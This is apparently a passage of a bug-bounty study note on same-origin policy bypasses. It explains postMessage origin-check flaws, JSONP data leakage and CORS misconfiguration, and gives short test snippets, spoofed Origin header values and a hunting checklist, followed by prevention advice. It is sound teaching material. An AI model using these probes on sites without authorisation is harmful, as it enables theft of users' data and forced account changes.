<p>Some sites work around SOP by using postMessage() ‚Üí A web API uses JS syntax</p>
<ul>
<li>Its used to send text based messages to another window.</li>
<li>The receiving window will handle this message with eventhandler:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">RECIPIENT_WINDOW</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#a6e22e">MESSAGE_TO_SEND</span>, <span style="color:#a6e22e">TARGET_ORIGIN</span>);
</span></span></code></pre></div><ul>
<li>
<p>window.addEventListener(&ldquo;message&rdquo;,EVENT_HANDLER_FUNCTION);</p>
<p>Postmessage() need a refernce to reseiver‚Äôs window, Message can be send only between <code>window</code></p>
<p>and its its <code>iframe</code> or <code>pop-up</code> only.</p>
</li>
</ul>
<h3 id="for-example"><code>For example:</code></h3>
<p>A window can use <a href="http://window.open">window.open</a> to refer to the window its open.</p>
<p>Alternavely it can use window.opener to refrernce window spwand in currnet window.</p>
<p>It can use window.frame to refrence the embedded iframe.</p>
<p>And it can use window.parent to refrence parent window of the current iframe.</p>
<p><code>For example:</code></p>
<p>say we‚Äôre trying to pass the following JSON blob located at <a href="http://a.example.com/user_info">a.example.com/user_info</a> to <a href="http://b.example.com/">b.example.com</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;vickieli&#39;</span>, <span style="color:#e6db74">&#39;account_number&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;12345&#39;</span>}
</span></span></code></pre></div><p><a href="http://a.example.com/">a.example.com</a> can open <a href="http://b.example.com/">b.example.com</a> and send a message to its window.</p>
<p>The <a href="http://window.open">window.open</a> func. will open the window of this url and return refrence to it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">recipient_window</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://b.example.com&#34;</span>, <span style="color:#a6e22e">b_domain</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">recipient_window</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#34;{&#39;username&#39;: &#39;vickieli&#39;, &#39;account_number&#39;: &#39;12345&#39;}&#34;</span>, <span style="color:#e6db74">&#34;*&#34;</span>);
</span></span></code></pre></div><p>At the same time, <a href="http://b.example.com/">b.example.com</a> would set up an event listener to process the data it receives:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parse_data</span>(<span style="color:#a6e22e">event</span>) {
</span></span><span style="display:flex;"><span> <span style="color:#75715e">// Parse the data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#a6e22e">parse_data</span>);
</span></span></code></pre></div><p>As you can see, <code>postMessage() does not bypass SOP directly</code> but provides
a way for <code>pages of different origins to send data to each other.</code></p>
<p>The postmessage() can be reliable way to <code>cross-origin</code> communication.</p>
<p>However when using it the sender and reciver must prove their <code>origins</code>.</p>
<p>Vulnerabilities happen when pages <code>enforce weak origin checks</code> or lack origin checks altogether.</p>
<h3 id="explaination"><code>Explaination:</code></h3>
<p>The postmessage() allow the sender to specify the receiver‚Äôs origin as parameter.</p>
<p>If the sender uses the wildcard ( * ) instead of specify a certain origin, it will be easy to leak information:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">RECIPIENT_WINDOW</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#a6e22e">MESSAGE_TO_SEND</span>, <span style="color:#f92672">*</span>);
</span></span></code></pre></div><p>The attacker can make a html page that listen to the event comes form sender page.</p>
<p>They can trick the user by triggering the postmessage() by malicious link to make the user to send data to attacker website.</p>
<p>To Prevent this issue Developers must specify Origin instead of Wildcard:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">recipient_window</span>.<span style="color:#a6e22e">postMessage</span>(
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;{&#39;username&#39;: &#39;vickieli&#39;, &#39;account_number&#39;: &#39;12345&#39;}&#34;</span>, <span style="color:#e6db74">&#34;https://b.example.com&#34;</span>);
</span></span></code></pre></div><p>On the other hand if the reciver dosen‚Äôt validate the page where the postmessage() came from, it can hep the attacker to send arbitrary data to the website and trigger unwanted actions.</p>
<h3 id="for-example-1"><code>For Example:</code></h3>
<p><a href="http://b.example.com/">b.example.com</a> allows <a href="http://a.example.com/">a.example.com</a> to trigger a password change based on a postMessage(), like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">recipient_window</span>.<span style="color:#a6e22e">postMessage</span>(
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;{&#39;action&#39;: &#39;password_change&#39;, &#39;username&#39;: &#39;vickieli&#39;, &#39;new_password&#39;: &#39;password&#39;}&#34;</span>, 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;https://b.example.com&#34;</span>);
</span></span></code></pre></div><p>The page <a href="http://b.example.com/">b.example.com</a> would then receive the message and process the request:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parse_data</span>(<span style="color:#a6e22e">event</span>) {
</span></span><span style="display:flex;"><span> <span style="color:#75715e">// If &#34;action&#34; is &#34;password_change&#34;, change the user&#39;s password
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#a6e22e">parse_data</span>);
</span></span></code></pre></div><p>Notice: any window can send a message to <a href="http://b.example.com">b.example.com</a> so any window can initiate a password change!!
Attacker can <code>expliot</code> this by embed or open victim page to obtain its refrence. Then he is free to send any arbitrary message to that window!!</p>
<p>To Prevent this tha page should verify the origin of the sender before processing it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parse_data</span>(<span style="color:#a6e22e">event</span>) {
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;https://a.example.com&#34;</span>){<span style="color:#75715e">//this line to verify the sender origin.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#75715e">// If &#34;action&#34; is &#34;password_change&#34;, change the user&#39;s password
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#a6e22e">parse_data</span>);
</span></span></code></pre></div><hr>
<h1 id="exploiting-json-with-padding"><code>Exploiting JSON with Padding</code></h1>
<p>JSONP is another technique that work around the SOP, It allow sender to <code>send JSON data as JS code</code>.</p>
<p>A page of different origin can read JSON data By processign JS.</p>
<h3 id="example-2"><code>Example:</code></h3>
<p>we‚Äôre trying to pass the following JSON blob located at <a href="http://a.example.com/user">a.example.com/user</a>_info to <a href="http://b.example.com/">b.example.com</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;vickieli&#34;</span>, <span style="color:#e6db74">&#34;account_number&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;12345&#34;</span>}
</span></span></code></pre></div><p>The SOP allow the HTML <!-- raw HTML omitted --> to load a script across the origins, its easy way for <a href="http://b.example.com">b.example.com</a> to recive data across the origins by loading the script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://a.example.com/user_info&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>This will make <a href="http://b.exmaple.com">b.exmaple.com</a> to include JSON data via JS but it will make syntax erro AS JSON data is not valid JS code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span> {<span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;vickieli&#34;</span>, <span style="color:#e6db74">&#34;account_number&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;12345&#34;</span>}
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>JSONP work with this by <code>wrapping the data in JS functionm and sending the data as JS code instead</code>.</p>
<p>The requesting page include the resource as <code>script</code> and define a call back funcion in url called <code>callback</code></p>
<p>This callback functions is predefined in reciving page to process it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://a.example.com/user_info?callback=parseinfo&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>It will return data wrapped in this function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">parseinfo</span>({<span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;vickieli&#34;</span>, <span style="color:#e6db74">&#34;account_number&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;12345&#34;</span>})
</span></span></code></pre></div><p>The reciving page will include this script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">parseinfo</span>({<span style="color:#e6db74">&#34;username&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;vickieli&#34;</span>, <span style="color:#e6db74">&#34;account_number&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;12345&#34;</span>})
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><h3 id="the-receiving-page-can-then-extract-the-data-by-running-the-javascript-code-and-processing-the-parseinfo-function">The receiving page can then extract the data by running the JavaScript code and processing the parseinfo() function.</h3>
<p><code>Summary:</code></p>
<ol>
<li>The data requestor includes the data‚Äôs URL in a script tag, along with
the name of a callback function.</li>
<li>The data provider returns the JSON data wrapped within the specified
callback function.</li>
<li>The data requestor receives the function and processes the data by running the returned JavaScript code.</li>
</ol>
<p>You can usually find out if a <code>site uses JSONP</code> by looking for script tags that include URLs with the terms <code>jsonp</code> or <code>callback</code>.</p>
<p>JSONP come with risk, Any attacker and embed srcipt tag on his website and request the data wrapped in JSON payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://a.example.com/user_info?callback=parseinfo&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>If a user is browsing the attacker‚Äôs site while logged into <a href="http://a.example.com/">a.example.com</a> at the same time, the user‚Äôs browser will include their credentials in this request and allow attackers to extract confidential data belonging to the
victim.
This is why JSONP is suitable for transmitting only public data.</p>
<p>CORS is a reliable option for cross-origin communication, sites no longer use JSONP as often.</p>
<hr>
<h1 id="hunting-for-sop-bypasses"><code>Hunting for SOP Bypasses</code></h1>
<p>SOP bypass vulnerabilities are caused by the <code>faulty of implementation of SOP relaxation techniques</code>.</p>
<h2 id="step-1-determine-if-sop-relaxation-techniques-are-used">Step 1: Determine If SOP Relaxation Techniques Are Used</h2>
<p>We can defiend tif the SOP relaxation is used by looking for signiture of each SOP relaxation.</p>
<p>When <code>browsering</code> the application, open your <code>proxy</code> and lood for any sign of cross-origin communication.</p>
<h3 id="for-example-2"><code>For example:</code></h3>
<p>CORS often return the <code>Access-Control-Allow-Origin</code> in HTTP Response.</p>
<p>A site could be using <code>postMessage( );</code> and find a message <code>enventListener</code></p>
<p>A site could be using JSONP if you see a URL being loaded in script callback function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://a.example.com/user_info?callback=parseinfo&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://a.example.com/user_info?jsonp=parseinfo&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/70459751/178596108-21e4b070-4449-47a6-b884-e4e0c35b9715.png" alt="image"></p>
<p>Figure 19-1: Finding the event listeners of a page in the Chrome browser</p>
<h2 id="step-2-find-cors-misconfiguration">Step 2: Find CORS Misconfiguration</h2>
<p>Check if the the Access-Control-Allow-Access response header is set to <code>Null</code> by sending:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>
</span></span></code></pre></div><p>If not try sending a request with any website like <a href="http://attacker.com">attacker.com</a> and check the response header:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span>
</span></span></code></pre></div><p>Finanlly set wether site properly validata the origin URL by submitting origin header like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">www</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>.<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">or</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span>.<span style="color:#a6e22e">www</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/70459751/178596267-227ff5a9-89b0-4e8a-94be-bbb2f2232d30.png" alt="image"></p>
<p>Checking for CORS misconfigrantion!!</p>
<h2 id="step-3-find-postmessage-bugs">Step 3: Find postMessage Bugs</h2>
<p>If the site using postMessage() see if you can send or recive messsafe as untrusted site.
Create an HTML page with an iframe that frames the targeted page accepting messages.</p>
<p>Try sending the message to the page that trigger a state-changeing behavior.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">recipient_window</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://TARGET_URL&#34;</span>, <span style="color:#a6e22e">target_domain</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">recipient_window</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#34;RANDOM MESSAGE&#34;</span>, <span style="color:#e6db74">&#34;*&#34;</span>);
</span></span></code></pre></div><p>You can also create an HTML page that listens for events coming from
the target page, and trigger the postMessage from the target site. See if you can receive sensitive data from the target page.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sender_window</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://TARGET_URL&#34;</span>, <span style="color:#a6e22e">target_domain</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parse_data</span>(<span style="color:#a6e22e">event</span>) {
</span></span><span style="display:flex;"><span> <span style="color:#75715e">// Run some code if we receive data from the target
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> }
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#a6e22e">parse_data</span>);
</span></span></code></pre></div><h2 id="step-4-find-jsonp-issues">Step 4: Find JSONP Issues</h2>
<p>Finally, if the site is using JSONP, see if you can embed a script tag on your
site and request the sensitive data wrapped in the JSONP payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://TARGET_URL?callback=parseinfo&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><h2 id="step-5-consider-mitigating-factors">Step 5: Consider Mitigating Factors</h2>
<p>When the target site does not rely on cookies for authentication, these SOP bypass misconfigurations might not be exploitable.</p>
<h1 id="finding-your-first-sop-bypass-vulnerability"><code>Finding Your First SOP Bypass Vulnerability!</code></h1>
<p>Go ahead and start looking for your first SOP bypass. To find SOP-bypass vulnerabilities, you will need to understand the SOP relaxation techniques the target is using. You may also want to become familiar with JavaScript in order to craft effective POCs.</p>
<ol>
<li>Find out if the application uses any SOP relaxation techniques. Is the application using CORS, postMessage, or JSONP?</li>
<li>If the site is using CORS, test the strength of the CORS allowlist by submitting test Origin headers.</li>
<li>If the site is using postMessage, see if you can send or receive messages as
an untrusted site.</li>
<li>If the site is using JSONP, try to embed a script tag on your site and
request the sensitive data wrapped in the JSONP payload.</li>
<li>Determine the sensitivity of the information you can steal using the vulnerability, and see if you can do something more.</li>
<li>Submit your bug report to the program!</li>
</ol>
<hr>
<h1 id="prevention"><code>Prevention</code></h1>
<p>Avoiding Null Origin in ACAO.</p>
<p>Developers can prevent CORS misconfigration by Creating will defined <code>CORS Policy</code>.</p>
<p>If the page have a sensitve informaitons, the server should return Access-Control-Allow-Origins If only its on <code>Whitelist</code>.</p>
<p>Avoid using wildcards in internal networks, Because <code>internal</code> websites can access <code>external</code> websites. For <code>public information</code>, the server can simply use the wildcard ( * ) designation for Access-Control-Allow-Origin.</p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
